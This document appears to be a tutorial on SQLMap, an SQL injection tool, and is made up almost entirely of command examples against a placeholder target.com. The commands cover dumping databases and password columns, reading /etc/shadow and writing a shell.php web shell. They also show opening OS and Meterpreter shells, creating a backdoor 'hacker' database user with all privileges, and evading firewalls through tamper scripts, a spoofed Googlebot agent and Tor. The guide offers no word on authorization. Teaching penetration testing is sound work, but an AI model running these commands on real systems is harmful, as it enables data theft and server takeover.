SQLMap Automated SQL Injection

What is SQLMap?

SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers.

Learning Objective: Master automated SQL injection testing, database enumeration, and exploitation using SQLMap's powerful features.

Key Features

  • Detection: Automatic SQL injection detection
  • Exploitation: Full database takeover
  • Database Support: MySQL, PostgreSQL, Oracle, MSSQL
  • Techniques: Boolean, time-based, error-based
  • Enumeration: Database structure mapping
  • Data Extraction: Table and column dumping
  • File System: File read/write operations
  • OS Commands: Operating system takeover

Installation & Setup

Kali Linux

# SQLMap is pre-installed in Kali Linux sqlmap --version # Update to latest version sudo apt update sudo apt install sqlmap # Manual installation from GitHub git clone https://github.com/sqlmapproject/sqlmap.git cd sqlmap python3 sqlmap.py --version

Other Linux Distributions

# Ubuntu/Debian sudo apt install sqlmap # CentOS/RHEL sudo yum install sqlmap # From pip pip3 install sqlmap-python3

Windows

# Download from GitHub https://github.com/sqlmapproject/sqlmap # Extract and run python sqlmap.py --version # Or use Windows Subsystem for Linux (WSL)

Basic SQLMap Usage

Simple URL Testing

# Basic vulnerability scan sqlmap -u "http://target.com/page.php?id=1" # Test specific parameter sqlmap -u "http://target.com/page.php?id=1&name=test" -p id # Test all parameters sqlmap -u "http://target.com/page.php?id=1&name=test" --all # Batch mode (non-interactive) sqlmap -u "http://target.com/page.php?id=1" --batch

POST Request Testing

# Test POST data sqlmap -u "http://target.com/login.php" --data="username=admin&password=test" # From Burp Suite request file sqlmap -r request.txt # Custom headers sqlmap -u "http://target.com/api" --headers="Authorization: Bearer token123" # Cookie-based injection sqlmap -u "http://target.com/page.php" --cookie="PHPSESSID=abc123; user_id=1"

Database Enumeration

# List databases sqlmap -u "http://target.com/page.php?id=1" --dbs # Current database sqlmap -u "http://target.com/page.php?id=1" --current-db # Database users sqlmap -u "http://target.com/page.php?id=1" --users # Database privileges sqlmap -u "http://target.com/page.php?id=1" --privileges

Advanced Techniques

Injection Techniques

# Specify injection techniques # B: Boolean-based blind # E: Error-based # U: Union query-based # S: Stacked queries # T: Time-based blind # Q: Inline queries sqlmap -u "http://target.com/page.php?id=1" --technique=BEUST # Time-based only (stealth) sqlmap -u "http://target.com/page.php?id=1" --technique=T # Union-based (fastest) sqlmap -u "http://target.com/page.php?id=1" --technique=U

Database-Specific Options

# Specify DBMS sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql # Database version sqlmap -u "http://target.com/page.php?id=1" --banner # Database hostname sqlmap -u "http://target.com/page.php?id=1" --hostname # Check if user is DBA sqlmap -u "http://target.com/page.php?id=1" --is-dba

Data Extraction

# List tables in database sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables # List columns in table sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns # Dump table data sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --dump # Dump specific columns sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C username,password --dump # Dump all databases sqlmap -u "http://target.com/page.php?id=1" --dump-all

Advanced Exploitation

File System Access

# Read files from server sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd" # Write files to server sqlmap -u "http://target.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php" # Common files to read --file-read="/etc/passwd" # Linux users --file-read="/etc/shadow" # Linux passwords --file-read="C:\Windows\System32\drivers\etc\hosts" # Windows hosts --file-read="/var/log/apache2/access.log" # Web server logs

Operating System Commands

# Execute OS commands sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami" # Interactive OS shell sqlmap -u "http://target.com/page.php?id=1" --os-shell # Meterpreter shell sqlmap -u "http://target.com/page.php?id=1" --os-pwn # Registry access (Windows) sqlmap -u "http://target.com/page.php?id=1" --reg-read

Database Takeover

# SQL shell sqlmap -u "http://target.com/page.php?id=1" --sql-shell # Create database user sqlmap -u "http://target.com/page.php?id=1" --sql-query="CREATE USER 'hacker'@'%' IDENTIFIED BY 'password123'" # Grant privileges sqlmap -u "http://target.com/page.php?id=1" --sql-query="GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'" # Upload and execute UDF (User Defined Functions) sqlmap -u "http://target.com/page.php?id=1" --udf-inject

WAF Evasion Techniques

Basic Evasion

# Random User-Agent sqlmap -u "http://target.com/page.php?id=1" --random-agent # Custom User-Agent sqlmap -u "http://target.com/page.php?id=1" --user-agent="Mozilla/5.0 (compatible; Googlebot/2.1)" # Delay between requests sqlmap -u "http://target.com/page.php?id=1" --delay=2 # Randomize delay sqlmap -u "http://target.com/page.php?id=1" --delay=1-3

Advanced Evasion

# Tamper scripts for WAF bypass sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment # Multiple tamper scripts sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,charencode # Common tamper scripts: --tamper=apostrophemask # Replace apostrophe with UTF-8 --tamper=base64encode # Base64 encode payload --tamper=charencode # URL encode characters --tamper=space2comment # Replace space with comments --tamper=versioncomment # Add version comments

Proxy and Tor

# Use proxy sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080" # Use Tor sqlmap -u "http://target.com/page.php?id=1" --tor --tor-type=SOCKS5 # Check Tor connection sqlmap -u "http://target.com/page.php?id=1" --tor --check-tor # Multiple proxies sqlmap -u "http://target.com/page.php?id=1" --proxy="http://proxy1:8080,http://proxy2:8080"

Output and Logging

# Verbose output sqlmap -u "http://target.com/page.php?id=1" -v 3 # Save session sqlmap -u "http://target.com/page.php?id=1" -s session.sqlite # Output to file sqlmap -u "http://target.com/page.php?id=1" --output-dir=/tmp/sqlmap # Traffic log sqlmap -u "http://target.com/page.php?id=1" -t traffic.log # Flush session sqlmap -u "http://target.com/page.php?id=1" --flush-session
